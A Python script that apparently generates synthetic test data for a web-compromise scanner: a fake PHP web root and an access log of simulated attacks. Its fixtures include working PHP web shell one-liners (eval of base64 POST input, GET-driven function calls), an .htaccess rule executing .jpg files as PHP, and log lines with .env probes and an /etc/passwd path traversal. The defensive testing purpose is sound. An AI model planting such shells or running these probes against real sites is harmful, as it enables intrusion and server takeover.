#!/usr/bin/env python3
"""Generate a synthetic web root and access log to try the tools without real data.

Everything is invented: documentation IP ranges (RFC 5737), a made-up domain
layout and harmless text files that merely contain strings the scanner matches.
Nothing is ever executed.
"""
from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

WEBROOT_FILES = {
    "web/index.php": "<?php // front controller\n",
    "web/app_dev.php": "<?php // dev front controller (should not exist on a live site)\n",
    "system/modules/core/Controller.php": "<?php class Controller { function run($pdo) { $pdo->exec('SELECT 1'); } }\n",
    "templates/page.html5": "<h1><?= $this->title ?></h1>\n",
    "files/images/logo.png": "not really a png\n",
    # planted indicators
    "files/uploads/cache.php": "<?php @eval(base64_decode($_POST['k']));\n",
    "files/gallery/photo.php.jpg": "GIF89a<?php echo 1; ?>\n",
    "files/.htaccess": "AddType application/x-httpd-php .jpg\n",
    "templates/mod_banner.html5": "<?php $f = $_GET['f']; $f($_GET['a']); ?>\n",
}


def write_webroot(out: Path) -> None:
    for rel, content in WEBROOT_FILES.items():
        path = out / "webroot" / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")


def log_line(when: datetime, ip: str, req: str, status: int, size: int, ua: str) -> str:
    return f'{ip} - - [{when.strftime("%d/%b/%Y:%H:%M:%S %z")}] "{req}" {status} {size} "-" "{ua}"'


def write_log(out: Path, seed: int) -> None:
    rng = random.Random(seed)
    tz = timezone(timedelta(hours=2))
    start = datetime(2026, 10, 20, 8, 0, 0, tzinfo=tz)
    lines = []
    visitors = [f"198.51.100.{i}" for i in range(1, 20)]
    pages = ["/", "/aktuelles", "/kontakt", "/files/images/logo.png", "/assets/css/main.css"]
    for i in range(400):  # normal traffic
        when = start + timedelta(seconds=i * 300 + rng.randint(0, 120))
        lines.append(log_line(when, rng.choice(visitors), f"GET {rng.choice(pages)} HTTP/1.1", 200,
                              rng.randint(500, 40000), "Mozilla/5.0 (X11; Linux x86_64)"))
    attacker = "203.0.113.50"
    t = start + timedelta(days=2, hours=3)
    for path in ["/.env", "/composer.json", "/_profiler/", "/app_dev.php", "/wp-login.php", "/xmlrpc.php"]:
        lines.append(log_line(t, attacker, f"GET {path} HTTP/1.1", 200 if path == "/composer.json" else 404, 300,
                              "Nuclei - Open-source project"))
        t += timedelta(seconds=1)
    for i in range(150):  # login brute force burst
        lines.append(log_line(t + timedelta(milliseconds=i * 300), "203.0.113.51", "POST /contao/login HTTP/1.1", 200, 4700,
                              "Mozilla/5.0"))
    t += timedelta(minutes=10)
    lines.append(log_line(t, attacker, "POST /index.php?c=../../etc/passwd HTTP/1.1", 500, 0, "Mozilla/5.0"))
    lines.append(log_line(t + timedelta(minutes=1), attacker, "POST /files/uploads/cache.php HTTP/1.1", 200, 20, "Mozilla/5.0"))
    lines.append(log_line(t + timedelta(minutes=2), attacker, "GET /files/uploads/cache.php?k=1 HTTP/1.1", 200, 20, "Mozilla/5.0"))
    lines.append(log_line(t + timedelta(days=1), "198.51.100.200", "GET /.env HTTP/1.1", 200, 120, "pentest-check (authorised)"))
    lines.insert(10, "this line is not a valid log line")
    lines.sort(key=lambda s: s.split("[", 1)[1][:20] if "[" in s else "")
    (out / "access.log").write_text("\n".join(lines) + "\n", encoding="utf-8")


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("out", type=Path, help="output directory (created if missing)")
    parser.add_argument("--seed", type=int, default=1)
    args = parser.parse_args(argv)
    args.out.mkdir(parents=True, exist_ok=True)
    write_webroot(args.out)
    write_log(args.out, args.seed)
    print(f"synthetic data written to {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
